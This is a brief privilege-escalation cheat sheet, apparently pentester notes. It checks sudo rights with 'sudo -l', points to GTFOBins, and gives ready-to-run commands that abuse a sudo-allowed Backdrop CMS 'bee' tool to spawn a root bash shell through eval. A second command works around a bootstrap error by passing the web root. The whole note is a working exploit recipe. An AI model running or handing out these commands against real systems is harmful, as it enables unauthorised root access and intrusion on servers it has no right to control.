```bash
sudo -l
```
#### [GTFOBins](https://gtfobins.github.io)

```
#BackDrop CMS 
sudo bee eval "system('/bin/bash');"

#In case of `The required bootstrap level for 'eval' is not ready.` Error
#Find the application path  - generally in /var/www/html
sudo /usr/local/bin/bee --root=/var/www/html eval "system('/bin/bash');"
```